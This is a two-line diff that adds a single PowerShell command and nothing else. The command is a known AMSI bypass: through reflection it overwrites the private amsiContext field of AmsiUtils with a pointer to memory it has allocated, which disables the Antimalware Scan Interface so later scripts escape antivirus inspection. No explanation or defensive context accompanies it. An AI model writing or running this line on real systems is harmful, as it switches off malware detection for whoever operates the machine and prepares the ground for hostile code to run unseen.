@@ -1,0 +1,2 @@
+$f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static'); $b=[Runtime.InteropServices.Marshal]::AllocHGlobal(9076); [Runtime.InteropServices.Marshal]::WriteInt32($b,0x1); $f.SetValue($null,[IntPtr]$b) # amsiSession
+
